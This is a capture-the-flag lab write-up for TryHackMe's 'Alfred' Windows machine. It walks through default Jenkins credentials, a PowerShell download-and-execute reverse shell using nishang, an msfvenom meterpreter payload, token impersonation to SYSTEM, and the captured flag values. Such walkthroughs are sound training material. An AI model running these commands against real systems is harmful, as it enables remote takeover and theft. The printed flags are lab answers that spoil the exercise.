# Alfred Writeup
#pentest/tryhackme

We start with the usual nmap to see which services are running.

```shell
nmap -sV 10.10.167.25
...
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
3389/tcp open  ssl/ms-wbt-server?
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Seems like we are running Jenkins on port 8080 and their username/password has never been modified!
After logging in with **admin/admin** we can modify our build steps to execute the commands we want.

**Go to:**
project -> configure -> build -> execute windows batch command

Cool, so now what we want to do is create a reverse shell:
1. Download [nishang/Invoke-PowerShellTcp.ps1 at master · samratashok/nishang · GitHub](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
	1. This is the script that will do this for us.
2. Start a python server on our machine so jenkins can download the script from us
	1. `python3 -m http.server`
3. Start a netcat listener that will receive a request from the windows machine
	1. `nc -nlvp 7777`
4. Now we have to instruct jenkins to download the script from us

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://<our-ip>:<our-python-server-port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <our-ip> -Port <our-netcat-port>
```

And we have a reverse shell! Let’s get the user flag!

```
PS1 > whoami
alfred/bruce
PS1 > cd C:\Users\bruce\Desktop
PS1 > more user.txt
79007a09481963edf2e1321abd9ae2a0
```

Let’s escalate our privileges:

1. Use msfvenom to create the a windows meterpreter reverse shell using the following payload
	1. `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`
2. Let’s make our windows machine download it using our cool jenkins build step
	1. `powershell “(New-Object System.Net.WebClient).Downloadfile(‘http://<ip>:8000/shell-name.exe’,’shell-name.exe’)”`
3. Open metasploit and configure the handler
	
```shell
$ msfconsole
msf5> use exploit/multi/handler 
msf5> set PAYLOAD windows/meterpreter/reverse_tcp 
msf5> set LHOST 10.2.13.100 
msf5> set LPORT 7777
msf5> run
```

After everything is set we execute our downloaded shell in our netcat listener.
 `Start-Process "shell-name.exe"`

And get the reverse handler on metasploit
`meterpreter>`

**Now that we have initial access, let’s use token impersonation to gain system access.**

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by **LSASS.exe**( think of this as an authentication process).

**This access token consists of:**
* user SIDs(security identifier)
* group SIDs
* privileges
* amongst other things. More detailed information can be found  [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens) .

**There are two types of access tokens:**
* primary access tokens: those associated with a user account that are generated on log on
* impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

**For an impersonation token, there are different levels:**
* SecurityAnonymous: current user/client cannot impersonate another user/client
* SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
* SecurityImpersonation: current user/client can impersonate the client’s security context on the local system
* SecurityDelegation: current user/client can impersonate the client’s security context on a remote system

where the security context is a data structure that contains users’ relevant security information.

**The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:**
* SeImpersonatePrivilege
* SeAssignPrimaryPrivilege
* SeTcbPrivilege
* SeBackupPrivilege
* SeRestorePrivilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeTakeOwnershipPrivilege
* SeDebugPrivilege

There’s more reading  [here](https://www.exploit-db.com/papers/42556) .

**Let’s see our user privileges**

```shell
PS C:\Program Files (x86)\Jenkins\workspace\project> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
...
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
...
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
...
```


We can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let’s use the incognito module that will allow us to exploit this vulnerability. 
```shell
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
...

meterpreter > impersonate_token "BUILTIN\Administrators"
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
``` 

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the **services.exe** process. First use the **ps** command to view processes and find the PID of the services.exe process. Migrate to this process using the command **migrate PID-OF-PROCESS**

```shell
meterpreter > ps
...
668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
...

meterpreter > migrate 668
[*] Migrating from 2472 to 668...
[*] Migration completed successfully.
meterpreter > cd C:\Windows\System32\config
meterpreter > cat root.txt
dff0f748678f280250f25a45b8046b4a
```
